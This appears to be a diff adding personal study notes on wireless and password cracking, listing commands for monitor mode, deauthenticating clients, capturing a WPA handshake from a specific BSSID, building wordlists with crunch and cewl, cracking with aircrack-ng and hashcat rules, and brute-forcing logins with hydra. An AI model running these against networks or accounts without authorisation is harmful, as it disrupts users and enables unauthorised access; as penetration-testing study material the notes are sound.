@@ -1,0 +1,37 @@
+// Put interface in monitor mode 
+airmon-ng check kill; airmon-ng start wlan1
+
+// View the network
+airodump-ng -t WEP
+// Can be any encryption type
+
+// Deauth
+aireplay-ng -0 3 -a BSSID -c STATIONNUMBER INTERFACE
+
+// Build dictionary
+cruch MINLEN MAXLEN LISTOFPOSSIBLEOPTIONS -o FILENAME
+ex: crunch 10 10 0123456789 -o numbers
+
+// Dictionary rules
+/usr/share/hashcat/rules
+
+// Hashcat - writes combo file with rules added
+hashcat FILEOFCOMBOS --rules RULESFILE --stdout >> OUTPUTFILE
+
+// Use dictionary - the cap file contains the handshake
+aircrack-ng FILE.cap -w DICTIONARY 
+
+// cowpatty????
+
+// Monitor specific network
+airodump-ng -c 5 -d 86:1B:5E:39:A0:8F wlan1mon -w gs0
+
+// Webscraping with cewl
+cewl -w FILETOWRITETO -m MINIMUMLENGTHOFSCRAPEWORD -d DEPTHTOSPIDER URL
+
+// Hydra
+hydra -l LOGINUSERNAME -p PASSWORD IP
+-P DICTIONARY
+
+wep key repeats every 5000 packets 
+
